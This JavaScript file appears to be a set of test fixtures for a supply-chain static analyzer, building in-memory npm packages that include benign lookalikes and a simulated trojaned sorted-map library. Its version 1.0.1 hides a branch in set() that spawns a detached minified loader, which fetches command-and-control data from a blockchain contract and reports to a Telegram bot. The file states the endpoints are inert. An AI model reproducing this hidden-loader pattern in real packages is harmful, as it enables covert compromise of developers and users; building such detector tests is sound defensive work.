'use strict';
// Runtime-payload fixtures, served as in-memory tarballs by
// scripts/serve-bootstrap-fixtures.js. None of these packages has an install
// script: the payload runs when the library is used, the way the btree
// campaign's did (Checkmarx, 2026-09-17). Only lockfiles live on disk.
//
// Everything is inert. The RPC URL carries no key, the bot URL no token, the
// contract address is made up, and nothing here is ever executed: the bytes
// exist so the static analyzer has something real to read. The endpoint
// strings are assembled at load time so this source file does not carry them
// whole.
const RPC = ['https://eth-', 'sepolia.g.', 'alchemy.com/v2/'].join('');
const BOT = ['https://api.', 'telegram.org/', 'bot'].join('');
const FAKE_CONTRACT = `0x${'5e'.repeat(20)}`;

// A plain sorted map. regex.exec and map.get are the lookalikes the exec and
// net detectors must not trip on, and the comment names Telegram's docs.
const BTREE_V1 = [
  "'use strict';",
  '// Bot-friendly key parsing, see https://core.telegram.org/bots/api',
  'const KEY = /^(\\d+)$/;',
  'class BTree {',
  '  constructor() { this.map = new Map(); }',
  '  get(k) { return this.map.get(k); }',
  '  set(k, v) {',
  '    const m = KEY.exec(String(k));',
  '    this.map.set(m ? Number(m[1]) : k, v);',
  '    return this;',
  '  }',
  '  keys() { return [...this.map.keys()].sort((a, b) => a - b); }',
  '}',
  'module.exports = BTree;',
  '',
].join('\n');

// 1.0.1: the same map, plus the loader branch in set().
const BTREE_V2 = BTREE_V1
  .replace("'use strict';", "'use strict';\nconst path = require('path');\nconst child_process = require('child_process');")
  .replace('  set(k, v) {\n', [
    '  set(k, v) {',
    '    if (k === 100) {',
    "      child_process.spawn(process.execPath, [path.join(__dirname, 'extended', 'sharedLoad.min.js'), String(k)],",
    "        { detached: true, stdio: 'ignore' }).unref();",
    '    }',
    '',
  ].join('\n'));

// Minified second stage on a single line: reads its C2 from a contract over
// RPC, reports to a bot.
const SHARED_LOAD = `"use strict";const r="${RPC}",t="${BOT}";async function q(){const x=await fetch(r,{method:"POST",`
  + `body:JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_call",params:[{to:"${FAKE_CONTRACT}",data:"0x"},"latest"]})});`
  + `const j=await x.json();await fetch(t+"0/sendMessage",{method:"POST",body:j.result})}q().catch(()=>{});\n`;

// Routine capabilities a runtime audit must stay quiet about: shelling out to
// git and fetching over https, and forking a bundled worker.
const GIT_HELPER = [
  "'use strict';",
  "const { execFileSync } = require('child_process');",
  "const https = require('https');",
  "exports.head = () => execFileSync('git', ['rev-parse', 'HEAD']).toString().trim();",
  "exports.ping = (url) => new Promise((ok) => https.get(url, ok));",
  '',
].join('\n');
const POOL = [
  "'use strict';",
  "const { fork } = require('child_process');",
  "const path = require('path');",
  "exports.worker = () => fork(path.join(__dirname, 'worker.js'));",
  '',
].join('\n');

// A web3 client with a public RPC default: c2 alone, which the audit reports
// at MEDIUM rather than HIGH.
const WALLET = `export const DEFAULT_RPC = '${RPC.replace('sepolia.g.', 'mainnet.g.')}';\n`;

// dir/lock: which fixture lockfile pins which version.
const SHAPES = [
  {
    name: 'btree-good',
    versions: {
      '1.0.0': { scripts: {}, manifest: { main: 'index.js' }, files: { 'index.js': BTREE_V1 } },
      '1.0.1': {
        scripts: {},
        manifest: { main: 'index.js' },
        files: { 'index.js': BTREE_V2, 'extended/sharedLoad.min.js': SHARED_LOAD },
      },
    },
  },
  {
    name: 'git-helper',
    versions: { '2.0.0': { scripts: {}, manifest: { exports: { '.': { require: './lib/git.js' } } }, files: { 'lib/git.js': GIT_HELPER } } },
  },
  {
    name: 'pool-lib',
    versions: { '1.2.0': { scripts: {}, manifest: { main: 'pool.js' }, files: { 'pool.js': POOL, 'worker.js': 'process.on("message", (m) => process.send(m));\n' } } },
  },
  {
    name: 'rpc-wallet',
    versions: { '3.0.0': { scripts: {}, manifest: { exports: './wallet.mjs' }, files: { 'wallet.mjs': WALLET } } },
  },
];

module.exports = { SHAPES };
